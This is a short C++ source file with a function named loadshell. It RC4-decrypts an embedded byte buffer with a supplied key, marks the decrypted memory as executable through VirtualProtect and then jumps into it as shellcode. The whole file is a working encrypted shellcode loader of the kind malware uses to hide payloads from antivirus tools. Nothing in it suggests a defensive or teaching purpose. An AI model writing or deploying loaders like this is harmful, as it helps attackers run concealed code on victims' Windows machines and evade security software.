#include <resources/cipher/rc4.h>
#include <vector>
#ifndef LOADSHELL_
	#define LOADSHELL_
void loadshell(std::string key, unsigned char rawData[], int dataLen);
#endif

void loadshell(std::string key, unsigned char rawData[], int dataLen)
{
	// load encData
	std::string encData = "";
	for (auto i = 0; i < dataLen; i++)
	{
		encData += rawData[i];
	}
	// std::cout << encData << std::endl;
	// Initilize the S and T vectors
	std::vector<int> S(256);
	std::vector<int> T(256);
	for (int i = 0; i < 256; i++)
	{
		S[i] = i;
		T[i] = key[(i % key.length())];
	}
	S = permute(S, T);

	std::string d = decrypt(S, encData);

	unsigned char* shellcode = (unsigned char*)d.c_str();

	DWORD useless;
	VirtualProtect(shellcode, dataLen, PAGE_EXECUTE_READWRITE, &useless);
	((void (*)())shellcode)();
}